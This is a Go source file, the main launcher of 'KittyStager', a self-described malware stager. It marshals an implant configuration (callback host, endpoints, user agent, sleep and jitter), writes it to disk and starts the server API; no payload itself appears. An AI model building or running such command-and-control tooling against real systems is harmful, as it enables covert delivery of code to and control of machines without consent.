package main

import (
	"KittyStager/internal/config"
	"KittyStager/server/api"
	"flag"
	"fmt"
	color "github.com/logrusorgru/aurora"
	"os"
)

func main() {
	path := flag.String("p", "config.yaml", "Path to the config file")
	flag.Parse()
	conf, _ := config.NewConfig(*path)
	host := fmt.Sprintf("%s://%s:%d", conf.GetProtocol(), conf.GetHost(), conf.GetPort())
	malConf := api.NewConfig(host,
		conf.GetEndpoint,
		conf.GetPostEndpoint(),
		conf.GetOpaqueEndpoint(),
		conf.GetUserAgent(),
		"",
		conf.GetSleep(),
		conf.GetJitter(),
	)
	c, err := malConf.MarshallConfig()
	if err != nil {
		fmt.Println("[!] Error", err)
		return
	}
	err = os.WriteFile(conf.GetMalPath(), c, 0644)
	if err != nil {
		fmt.Println("[!] Error", err)
		return
	}
	fmt.Println(color.BrightCyan("                     _\n                    / )\n                   ( (\n     A.-.A  .-\"\"-.  ) )\n    / , , \\/      \\/ /\n   =\\  t  ;=    /   /\n     `--,'  .\"\"|   /\n         || |  \\\\ \\\n        ((,_|  ((,_\\\n"))
	fmt.Println(color.BrightCyan("KittyStager - A simple stager written in Go\n"))
	fmt.Println("[*] Running...")
	err = api.Api(conf)
	if err != nil {
		fmt.Println("[!] Error", err)
		return
	}
}
